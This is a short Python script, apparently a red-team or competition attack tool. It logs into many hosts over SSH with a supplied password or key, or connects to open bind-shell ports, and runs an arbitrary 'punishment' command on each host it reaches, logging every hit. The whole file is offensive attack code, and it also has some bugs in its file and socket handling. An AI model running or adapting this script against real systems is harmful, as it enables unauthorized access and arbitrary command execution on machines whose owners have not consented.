import paramiko
import socket
import datetime
import re
import yaml
import os


def logme(error):
	f = open('log.log', 'a')
	f.write(str(datetime.datetime.now()) + ": ")
	f.write(error)
	f.close()


def read_creds(ip_group, ip):
	rex = re.search('(\d{1,3}\.\d{1,3}\.)\d{1,3}(\.\d{1,3})', ip)
	return ip_group[rex.group(1) + 'x' + rex.group(2)][0]


def initial_read():
	f = open(os.path.join("YML",'hosts.yml'), 'r')
	with open('hosts.yml') as f:
		os_groups = yaml.safe_load(f)
	with open(os.path.join("YML",'usernames.yml')) as f:
		ip_groups = yaml.safe_load(f)
	Targets = TargetClctn(os_groups, ip_groups)
	return Targets


class TargetClctn(object):
	def __init__(self, os_group, ip_group):
		self.os_group = os_group
		self.ip_group = ip_group

	def ssh_check(self, password, punishment,groups):
		for i in groups:
			for ip in self.os_group[i]:
				username = read_creds(self.ip_group, ip)
				sshcon = paramiko.SSHClient()
				try:
					sshcon.connect(hostname=ip, username=username, password=password, timeout=3)
					sshcon.exec_command(punishment)
					logme(ip + " punished with " + punishment + "\n")
				except Exception as e:
					logme(ip + " not vulnerable with password " + password + "\n")

	def ssh_wkey(self, key, punishment,groups):
		for i in groups:
			for ip in self.os_group[i]:
				username = read_creds(self.ip_group, ip)
				sshcon = paramiko.SSHClient()
				try:
					sshcon.connect(ip, username=username, key_filename=key) # no passwd needed
					sshcon.exec_command(punishment)
					logme(ip + " punished with " + punishment + "\n")
				except Exception as e:
					logme(ip + " not vulnerable with key " + key + "\n")

	def bind_shell(self, port, punishment, groups):
		for i in groups:
			for ip in self.os_group[i]:
				username = read_creds(self.ip_group, ip)
				try:
					sock = socket.socket()
					sock.connect((ip, port))
					sock.send(punishment)
					logme(ip + " punished with " + punishment + "\n")
					sock.close()
				except Exception as e:
					logme(ip + " not open on port " + port + "\n")
